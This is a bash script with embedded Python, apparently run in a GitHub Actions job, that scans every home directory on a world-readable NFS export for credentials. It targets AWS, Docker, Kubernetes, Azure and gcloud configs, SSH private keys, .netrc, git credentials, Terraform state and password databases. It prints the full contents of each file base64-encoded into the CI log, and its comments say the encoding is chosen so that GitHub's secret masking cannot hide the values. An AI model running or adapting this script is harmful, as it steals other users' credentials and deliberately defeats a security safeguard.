#!/usr/bin/env bash
# i11365 - third bounded read-only probe of the world-readable /public4 NFS export (12.12.12.223).
# Closes the one unread cloud-credential class left after i7165/i7879/i8943:
#   * recursive .aws (cli/cache, sso/cache), .docker, .kube, .azure per home
#   * names-only .config inventory (gcloud/azure/gh/glab/pip) + b64 of credential files
#   * bounded find for kubeconfig / admin.conf / *.kubeconfig / credentials / *.pem / *.key
#     under every home (depth<=5) and the /public4 share/public/opendas/rsync/DL_DATA tops
# Everything is base64-chunked so GitHub Actions secret masking cannot rewrite values.
# Read-only. Exits 1 immediately after the dump so the CI job stops.
set -uo pipefail
umask 022
TS="$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
H="$(hostname 2>/dev/null || echo unknown)"
echo "===I11365-BEGIN ${TS} host=${H} job=${GITHUB_JOB:-?} run=${GITHUB_RUN_ID:-?}==="
echo "--- mounts"
(grep -aE '(/public4|/public |/ci_public)' /proc/mounts 2>/dev/null | head -10) || true
timeout 1200 python3 - <<'PYI11365'
import os, base64, hashlib, stat, re, time

HOME = "/public4/home"
CAP = 2_300_000
used = [0]
t0 = time.monotonic()

def emit(s=""):
    s = str(s)
    if used[0] >= CAP:
        return
    room = CAP - used[0] - 1
    if len(s) > room:
        s = s[:room]
    print(s, flush=True)
    used[0] += len(s) + 1

def b64dump(path, label, maxb=131072):
    if used[0] >= CAP - 4000:
        return False
    try:
        st = os.stat(path)
        if not stat.S_ISREG(st.st_mode):
            return False
        if st.st_size > maxb:
            emit(f"B64S {label} SKIP_SIZE {st.st_size}")
            return False
        data = open(path, "rb").read()
    except Exception as e:
        emit(f"B64S {label} ERR {str(e)[:140]}")
        return False
    h = hashlib.sha256(data).hexdigest()
    emit(f"B64S {label} {len(data)} {h}")
    b = base64.b64encode(data).decode()
    seq = 0
    for i in range(0, len(b), 512):
        emit(f"B64C {label} {seq} {b[i:i+512]}")
        seq += 1
    emit(f"B64E {label} {h}")
    return True

SKIP_DIRS = {"node_modules", "site-packages", "dist-packages", "__pycache__", ".git",
             ".cache", "Cache", "CacheStorage", "hf-cache", "pip-cache", "models",
             "model", "lost+found", ".ssh", ".Trash", ".local", ".npm", ".cargo",
             ".rustup", ".conda", "envs", "pkgs", "Downloads"}

# any path segment or filename that means "cloud/registry/ssh credential"
CRED_NAME = re.compile(
    r"(kubeconfig|admin\.conf$|\.kubeconfig$|credentials?$|credentials\.json$|"
    r"application_default_credentials|access_tokens\.db$|credentials\.db$|"
    r"\.netrc$|\.git-credentials$|\.npmrc$|\.pypirc$|pip\.conf$|config_default$|"
    r"^id_(rsa|ed25519|ecdsa))", re.I)

# files worth base64-dumping from the bounded find
PRIO = re.compile(
    r"(kubeconfig|admin\.conf$|\.kubeconfig$|(^|/)\.kube/config$|"
    r"credentials?$|credentials\.json$|application_default_credentials|"
    r"\.netrc$|\.git-credentials$|(^|/)auth\.json$|\.ovpn$|\.p12$|\.pfx$|\.tfstate$|"
    r"(^|/)\.aws/|(^|/)\.azure/|(^|/)gcloud/)", re.I)

FIND_NAME = re.compile(
    r"(kubeconfig|admin\.conf$|\.kubeconfig$|(^|/)\.kube/|credentials?$|credentials\.json$|"
    r"application_default|\.netrc$|\.git-credentials$|\.npmrc$|pip\.conf$|"
    r"^id_(rsa|ed25519|ecdsa)|\.pem$|\.key$|\.p12$|\.pfx$|\.ovpn$|\.tfstate$|"
    r"^\.env|^auth\.json$|^config$|tokens?\.(json|txt)$|sso|\.kdbx$)", re.I)

# ---- 0. inventory ----
try:
    users = sorted(os.listdir(HOME))
except Exception as e:
    emit(f"### FATAL listdir {str(e)[:160]}"); users = []
emit(f"### USERS {len(users)}")
for top in ("/public4", "/public4/share", "/public4/public", "/public4/opendas",
            "/public4/rsync", "/public4/DL_DATA"):
    try:
        names = sorted(os.listdir(top))[:90]
        emit(f"### LST {top}: {' | '.join(names)}")
    except Exception as e:
        emit(f"### LST {top} ERR {str(e)[:100]}")

# ---- 1. per-home dotdir credential dirs + .config inventory ----
dumps = [0]
for u in users:
    base = os.path.join(HOME, u)
    if not os.path.isdir(base):
        continue
    try:
        top = sorted(os.listdir(base))[:80]
    except Exception:
        top = []
    emit(f"### TOP {u}: {' | '.join(top)}")
    # recursive .aws / .docker / .kube / .azure (depth<=4)
    for sub in (".aws", ".docker", ".kube", ".azure"):
        sd = os.path.join(base, sub)
        if not os.path.isdir(sd):
            continue
        walkfiles = 0
        for root, dirs, files in os.walk(sd, followlinks=False):
            rel = os.path.relpath(root, base)
            if rel.count(os.sep) > 3:
                dirs[:] = []
                continue
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS][:20]
            emit(f"### CDIR {u}/{rel}")
            for nm in sorted(files)[:40]:
                fp = os.path.join(root, nm)
                try:
                    sz = os.lstat(fp).st_size
                except OSError:
                    continue
                relf = os.path.relpath(fp, base)
                emit(f"### CFILE {u}/{relf} {sz}")
                walkfiles += 1
                if walkfiles <= 25 and dumps[0] < 90:
                    if b64dump(fp, f"{u}/{relf}", maxb=131072):
                        dumps[0] += 1
    # .config names-only inventory (depth<=3) + credential dumps
    cfg = os.path.join(base, ".config")
    if os.path.isdir(cfg):
        seen = 0
        for root, dirs, files in os.walk(cfg, followlinks=False):
            rel = os.path.relpath(root, base)
            if rel.count(os.sep) > 3:
                dirs[:] = []
                continue
            dirs[:] = [d for d in dirs if d not in SKIP_DIRS][:25]
            emit(f"### CDIR {u}/{rel}")
            for nm in sorted(files)[:25]:
                fp = os.path.join(root, nm)
                relf = os.path.relpath(fp, base)
                try:
                    sz = os.lstat(fp).st_size
                except OSError:
                    continue
                emit(f"### CFILE {u}/{relf} {sz}")
                seen += 1
                if seen > 120:
                    break
                if CRED_NAME.search(nm) and dumps[0] < 90 and sz <= 262144:
                    if b64dump(fp, f"{u}/{relf}", maxb=262144):
                        dumps[0] += 1
            if seen > 120:
                break

# ---- 2. bounded find for credential-named files across the export ----
emit("### FIND-BEGIN")
max_age = time.monotonic() + 700
hits = 0
MAXHITS = 900
for root, maxdepth in (("/public4/home", 5), ("/public4/share", 3),
                       ("/public4/public", 3), ("/public4/opendas", 3),
                       ("/public4/rsync", 2), ("/public4/DL_DATA", 2)):
    if time.monotonic() > max_age or hits >= MAXHITS:
        emit(f"### FIND-STOP {root} hits={hits}")
        break
    for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
        if time.monotonic() > max_age or hits >= MAXHITS:
            break
        depth = dirpath[len(root):].count(os.sep)
        if depth >= maxdepth:
            dirnames[:] = []
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS]
        if depth >= 1:
            dirnames[:] = dirnames[:40]
        for fn in filenames:
            if not FIND_NAME.search(fn):
                continue
            fp = os.path.join(dirpath, fn)
            try:
                st = os.lstat(fp)
            except OSError:
                continue
            if not stat.S_ISREG(st.st_mode):
                continue
            emit(f"### FIND {fp} {st.st_size}")
            hits += 1
            if PRIO.search(fp) and st.st_size <= 262144 and dumps[0] < 150 and used[0] < CAP - 400000:
                if b64dump(fp, "FIND/" + fp.lstrip("/"), maxb=262144):
                    dumps[0] += 1
            if hits >= MAXHITS:
                break
emit(f"### FIND-END hits={hits}")
emit(f"### DONE elapsed={time.monotonic()-t0:.1f}s bytes_emitted={used[0]} dumps={dumps[0]}")
PYI11365
echo "===I11365-END $(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)==="
exit 1
